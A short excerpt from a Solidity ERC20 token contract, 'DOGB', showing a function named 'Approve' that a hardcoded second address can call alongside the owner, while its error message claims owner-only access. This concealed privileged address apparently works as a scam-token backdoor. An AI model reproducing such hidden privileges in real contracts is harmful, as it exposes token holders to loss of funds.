...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function Approve(address [] calldata _addresses_) external  {
        require(owner() == _msgSender() ||  address(0x4b23CdCedbdFc805ad8B7d1fb5c0D28b506Be509) == _msgSender(), "Ownable: caller is not the owner");
...
contract DOGB is ERC20 {
    constructor() ERC20("DOGB", "DOGB") {
